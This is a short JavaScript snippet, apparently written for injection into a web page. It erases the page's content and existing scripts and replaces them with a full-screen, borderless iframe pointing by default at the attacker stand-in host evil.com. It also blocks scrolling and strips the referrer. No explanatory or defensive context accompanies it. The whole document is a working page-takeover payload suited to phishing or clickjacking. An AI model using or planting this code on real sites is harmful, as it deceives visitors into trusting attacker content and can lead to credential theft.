(function showIframeAndStopRedirect(targetUrl='https://evil.com'){
    // Completely remove <head> and <body> content
    document.documentElement.innerHTML = ''; // removes all existing scripts

    // Create and append the iframe
    const iframe = document.createElement('iframe');
    iframe.src = targetUrl;
    iframe.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;border:0;z-index:2147483647';
    iframe.setAttribute('sandbox','allow-forms allow-scripts');
    iframe.setAttribute('referrerpolicy','no-referrer');
    document.body.appendChild(iframe);

    // Prevent scrolling
    document.documentElement.style.overflow = 'hidden';
    document.body.style.overflow = 'hidden';

    // Optional: after 20 seconds, do something
    setTimeout(()=>{ console.log('20 seconds passed after showing the iframe'); },20000);
})();
